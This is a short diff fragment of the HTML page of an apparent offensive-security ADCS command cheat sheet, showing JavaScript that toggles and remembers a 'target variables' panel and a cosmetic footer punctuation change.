+function setVarsOpen(open){const vb=document.getElementById('vars-body');const btn=document.getElementById('vars-toggle');if(open){vb.classList.add('open');btn.textContent='⚡ TARGET VARIABLES - (collapse)';}else{vb.classList.remove('open');btn.textContent='⚡ TARGET VARIABLES - Click to fill all commands automatically';}localStorage.setItem('adcs_vars_open',open?'1':'0');}
 document.getElementById('vars-toggle').addEventListener('click',()=>setVarsOpen(!document.getElementById('vars-body').classList.contains('open')));
 setVarsOpen(localStorage.getItem('adcs_vars_open')!=='0');
 
@@ -846,7 +846,7 @@ renderCommands();
 loadVars();
 </script>
 <footer style="text-align:center;padding:1.5rem;border-top:1px solid var(--mah-border);color:var(--mah-text-secondary);font-size:0.75rem;font-family:'JetBrains Mono',monospace;margin-top:2rem;">
-  Built with <span style="color:#f87171;">&hearts;</span> by Mahdiesta — Offensive Security Toolkit
+  Built with <span style="color:#f87171;">&hearts;</span> by Mahdiesta - Offensive Security Toolkit
 </footer>
 
 </body>
